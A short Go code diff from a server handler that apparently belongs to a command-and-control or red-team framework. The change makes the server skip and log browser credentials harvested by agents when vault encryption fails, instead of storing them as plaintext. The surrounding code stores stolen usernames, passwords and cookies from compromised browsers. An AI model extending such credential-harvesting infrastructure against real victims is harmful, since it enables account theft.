@@ -125,12 +125,20 @@ func (s *Server) handleProcessBrowserResult(c *gin.Context) {
 	for _, credStr := range req.Credentials {
 		// Expected format: browser|url|username|password|cookie_data
 		// This will be parsed by the agent and sent in structured format
+		notes, err := encryptCredNotes(credStr)
+		if err != nil {
+			// Fail-closed: a vault failure must not store harvested
+			// credentials as plaintext. The entry is skipped and counted
+			// as not created so the operator sees the shortfall.
+			slog.Error("Browser credential dropped, vault encryption failed", "agent_id", req.AgentID, "task_id", req.TaskID, "err", err)
+			continue
+		}
 		cred := db.CredentialEntry{
 			AgentID: req.AgentID,
 			Source:  "browser",
 			Type:    "cleartext",
 			TaskID:  req.TaskID,
-			Notes:   encryptCredNotes(credStr),
+			Notes:   notes,
 		}
 
 		if err := s.db.Create(&cred).Error; err == nil {
